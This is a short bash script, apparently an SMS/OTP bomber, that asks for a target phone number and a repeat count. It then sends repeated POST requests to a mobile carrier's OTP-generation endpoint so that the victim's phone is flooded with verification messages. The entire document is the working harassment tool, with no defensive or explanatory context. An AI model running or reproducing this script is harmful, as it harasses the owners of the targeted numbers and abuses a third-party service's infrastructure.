#!/bin/bash

url="https://registrasi.tri.co.id/daftar/generateOTP"
read -p "[+] Target	: " target
read -p "[+] Spam Limit	: " limit
echo -ne "\n"

for i in $(seq 1 $limit):
  do
	payload=$(curl -X POST --silent $url -d "msisdn=$target")
	echo -ne "[+] Status -> $payload\n"
done
